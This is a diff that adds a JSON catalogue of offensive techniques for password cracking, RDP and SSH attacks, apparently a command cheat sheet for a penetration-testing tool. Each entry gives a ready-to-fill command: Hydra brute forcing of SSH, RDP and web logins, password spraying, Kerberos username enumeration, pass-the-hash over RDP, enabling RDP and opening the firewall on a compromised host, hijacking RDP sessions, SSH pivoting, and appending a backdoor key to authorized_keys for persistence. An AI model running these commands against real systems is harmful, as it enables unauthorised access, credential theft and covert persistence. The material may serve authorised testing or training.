@@ -1,0 +1,39 @@
+[
+  {
+    "category": "Password Attacks",
+    "techniques": [
+      {"id":"pass_1","name":"Hydra SSH Brute Force","purpose":"Brute force SSH login","when_to_use":"When SSH is open and you have a username","command":"hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP} -t 4","tags":["hydra","ssh","brute"]},
+      {"id":"pass_2","name":"Hydra HTTP POST Brute Force","purpose":"Brute force web login form","when_to_use":"When a login form exists","command":"hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt {TARGET_IP} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'","tags":["hydra","web","brute"]},
+      {"id":"pass_3","name":"Hashcat NTLM Crack","purpose":"Crack NTLM hash offline","when_to_use":"After dumping NTLM hashes","command":"hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt","tags":["hashcat","ntlm","crack"]},
+      {"id":"pass_4","name":"Hashcat MD5 Crack","purpose":"Crack MD5 hash","when_to_use":"When you have an MD5 hash","command":"hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt","tags":["hashcat","md5","crack"]},
+      {"id":"pass_5","name":"John the Ripper","purpose":"Crack password hashes","when_to_use":"General hash cracking","command":"john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt","tags":["john","crack"]},
+      {"id":"pass_6","name":"CrackMapExec Password Spray","purpose":"Spray one password across many users","when_to_use":"When you have a user list and one password","command":"crackmapexec smb {TARGET_IP} -u users.txt -p '{PASSWORD}' --continue-on-success","tags":["cme","spray","smb"]},
+      {"id":"pass_7","name":"Kerbrute User Enum","purpose":"Enumerate valid AD usernames via Kerberos","when_to_use":"When targeting AD without credentials","command":"kerbrute userenum -d {TARGET_DOMAIN} --dc {TARGET_IP} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt","tags":["kerbrute","ad","enum"]}
+    ]
+  },
+  {
+    "category": "RDP Attacks",
+    "techniques": [
+      {"id":"rdp_1","name":"RDP Login via xfreerdp","purpose":"Connect to Windows machine over RDP","when_to_use":"When port 3389 is open and you have credentials","command":"xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore +clipboard /dynamic-resolution","tags":["rdp","xfreerdp"]},
+      {"id":"rdp_2","name":"RDP Pass-the-Hash","purpose":"Authenticate to RDP using NTLM hash","when_to_use":"When you have NTLM hash and Restricted Admin is enabled","command":"xfreerdp /v:{TARGET_IP} /u:{USERNAME} /pth:{PASSWORD} /cert:ignore +clipboard","tags":["rdp","pth","xfreerdp"]},
+      {"id":"rdp_3","name":"RDP Port Check","purpose":"Verify RDP is open","when_to_use":"Initial enumeration","command":"nmap -p 3389 --script rdp-enum-encryption {TARGET_IP}","tags":["rdp","nmap"]},
+      {"id":"rdp_4","name":"RDP Brute Force via Hydra","purpose":"Brute force RDP credentials","when_to_use":"When RDP is open and you have a username list","command":"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP} -t 1 -W 3","tags":["rdp","hydra","brute"]},
+      {"id":"rdp_5","name":"RDP via Proxychains (Pivot)","purpose":"Access RDP through a pivot host","when_to_use":"When RDP target is on internal network","command":"proxychains xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore","tags":["rdp","pivot","proxychains"]},
+      {"id":"rdp_6","name":"Enable RDP via Registry","purpose":"Enable RDP on compromised host","when_to_use":"After gaining admin shell on Windows","command":"reg add 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f","tags":["rdp","windows","enable"]},
+      {"id":"rdp_7","name":"Add Firewall Rule for RDP","purpose":"Allow RDP through Windows firewall","when_to_use":"After enabling RDP if firewall blocks it","command":"netsh advfirewall firewall add rule name='RDP' protocol=TCP dir=in localport=3389 action=allow","tags":["rdp","firewall","windows"]},
+      {"id":"rdp_8","name":"RDP Session Hijack","purpose":"Hijack another user's RDP session","when_to_use":"When SYSTEM privileges are available","command":"tscon {SESSION_ID} /dest:{YOUR_SESSION}","tags":["rdp","hijack","privesc"]}
+    ]
+  },
+  {
+    "category": "SSH Attacks",
+    "techniques": [
+      {"id":"ssh_1","name":"SSH Login","purpose":"Connect to remote host via SSH","when_to_use":"When SSH (22) is open and you have credentials","command":"ssh {USERNAME}@{TARGET_IP}","tags":["ssh"]},
+      {"id":"ssh_2","name":"SSH with Private Key","purpose":"Authenticate using SSH private key","when_to_use":"When you have found an id_rsa file","command":"chmod 600 id_rsa && ssh -i id_rsa {USERNAME}@{TARGET_IP}","tags":["ssh","key"]},
+      {"id":"ssh_3","name":"SSH Local Port Forward","purpose":"Forward a remote port to localhost","when_to_use":"To access internal services through SSH","command":"ssh -L 8080:{TARGET_IP}:80 {USERNAME}@{PIVOT_IP} -N","tags":["ssh","tunnel","pivot"]},
+      {"id":"ssh_4","name":"SSH Dynamic SOCKS Proxy","purpose":"Route all traffic through SSH tunnel","when_to_use":"When pivoting into internal network","command":"ssh -D 1080 {USERNAME}@{PIVOT_IP} -N -f","tags":["ssh","socks","pivot"]},
+      {"id":"ssh_5","name":"SSH Remote Port Forward","purpose":"Expose internal port to attacker machine","when_to_use":"When getting reverse shell through firewall","command":"ssh -R 4444:localhost:4444 {USERNAME}@{TARGET_IP} -N","tags":["ssh","tunnel"]},
+      {"id":"ssh_6","name":"SSH Brute Force","purpose":"Brute force SSH credentials","when_to_use":"When SSH is open and no creds available","command":"hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP} -t 4 -V","tags":["ssh","hydra","brute"]},
+      {"id":"ssh_7","name":"Add SSH Backdoor Key","purpose":"Persist access via SSH key","when_to_use":"After gaining write access to ~/.ssh/","command":"echo 'YOUR_PUBLIC_KEY' >> /home/{USERNAME}/.ssh/authorized_keys","tags":["ssh","persistence"]}
+    ]
+  }
+]
